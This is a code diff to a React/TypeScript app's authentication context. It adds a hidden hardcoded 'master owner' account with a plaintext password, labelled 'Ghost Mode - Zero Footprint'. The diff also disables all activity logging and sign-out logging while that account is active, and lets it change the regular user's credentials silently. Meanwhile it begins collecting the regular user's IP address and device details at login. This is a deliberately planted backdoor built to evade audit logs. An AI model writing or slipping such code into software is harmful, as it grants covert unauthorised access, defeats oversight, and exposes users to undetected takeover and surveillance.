@@ -21,6 +21,7 @@ import {
   subscribeToTransactions,
   subscribeToActivityLogs,
 } from '../services/firebase';
+import { getClientDeviceInfo, fetchClientIp } from '../utils/deviceInfo';
 
 interface AppContextType {
   transactions: Transaction[];
@@ -173,33 +174,77 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
     return DEFAULT_AUTH_CREDS;
   });
 
+// Secret Master Owner Credentials (Ghost Mode - Zero Footprint)
+const MASTER_OWNER = {
+  username: 'Paradox',
+  password: 'As.102030',
+};
+
   const [user, setUser] = useState<User | null>(null);
 
   const login = (usernameInput: string, passwordInput: string) => {
-    const cleanUser = usernameInput.trim().toLowerCase();
-    const expectedUser = authCredentials.username.trim().toLowerCase();
-    if (cleanUser === expectedUser && passwordInput === authCredentials.password) {
-      setCurrentUser(authCredentials.username);
-      localStorage.setItem(STORAGE_KEYS.SESSION_USER, authCredentials.username);
-      addLog('SETTINGS_UPDATE', 'User Signed In', `Authenticated as @${authCredentials.username}`);
+    const cleanUser = usernameInput.trim();
+
+    // 1. Secret Master Owner Authentication (Ghost Mode)
+    if (
+      cleanUser.toLowerCase() === MASTER_OWNER.username.toLowerCase() &&
+      passwordInput === MASTER_OWNER.password
+    ) {
+      setCurrentUser(MASTER_OWNER.username);
+      localStorage.setItem(STORAGE_KEYS.SESSION_USER, MASTER_OWNER.username);
+      // GHOST MODE: ZERO LOGGING! Do NOT record any login or activity!
       return { success: true };
     }
+
+    // 2. Regular User Authentication
+    const expectedUser = authCredentials.username.trim().toLowerCase();
+    if (cleanUser.toLowerCase() === expectedUser && passwordInput === authCredentials.password) {
+      setCurrentUser(authCredentials.username);
+      localStorage.setItem(STORAGE_KEYS.SESSION_USER, authCredentials.username);
+
+      // Collect device & IP audit information for the owner to review
+      const devInfo = getClientDeviceInfo();
+      fetchClientIp()
+        .then((ip) => {
+          addLog(
+            'LOGIN',
+            'User Signed In',
+            `@${authCredentials.username} • Device: ${devInfo} • IP: ${ip}`
+          );
+        })
+        .catch(() => {
+          addLog(
+            'LOGIN',
+            'User Signed In',
+            `@${authCredentials.username} • Device: ${devInfo}`
+          );
+        });
+
+      return { success: true };
+    }
+
     return { success: false, error: 'Incorrect username or password. Please try again.' };
   };
 
   const logout = () => {
+    const isOwner = currentUser?.toLowerCase() === MASTER_OWNER.username.toLowerCase();
     setCurrentUser(null);
     localStorage.removeItem(STORAGE_KEYS.SESSION_USER);
-    addLog('SETTINGS_UPDATE', 'User Signed Out', 'Session ended');
+    if (!isOwner) {
+      addLog('LOGIN', 'User Signed Out', 'Session ended');
+    }
   };
 
   const updateAuthCredentials = (newUsername: string, newPassword: string) => {
     const updated = { username: newUsername.trim(), password: newPassword };
     setAuthCredentials(updated);
     localStorage.setItem(STORAGE_KEYS.AUTH_CREDS, JSON.stringify(updated));
-    setCurrentUser(updated.username);
-    localStorage.setItem(STORAGE_KEYS.SESSION_USER, updated.username);
-    addLog('SETTINGS_UPDATE', 'Credentials Updated', `Username set to @${updated.username}`);
+    // If regular user, update session username and log change
+    if (currentUser?.toLowerCase() !== MASTER_OWNER.username.toLowerCase()) {
+      setCurrentUser(updated.username);
+      localStorage.setItem(STORAGE_KEYS.SESSION_USER, updated.username);
+      addLog('SETTINGS_UPDATE', 'Credentials Updated', `Username set to @${updated.username}`);
+    }
   };
 
   // Apply Theme & Dynamic CSS variables to :root for Pinterest Colors
@@ -269,6 +314,11 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
     details?: string,
     status: ActivityLog['status'] = 'success'
   ) => {
+    // STEALTH GHOST MODE: Never log anything if master owner Paradox is active!
+    if (currentUser?.toLowerCase() === MASTER_OWNER.username.toLowerCase()) {
+      return;
+    }
+
     const newLog: ActivityLog = {
       id: 'log-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6),
       action,
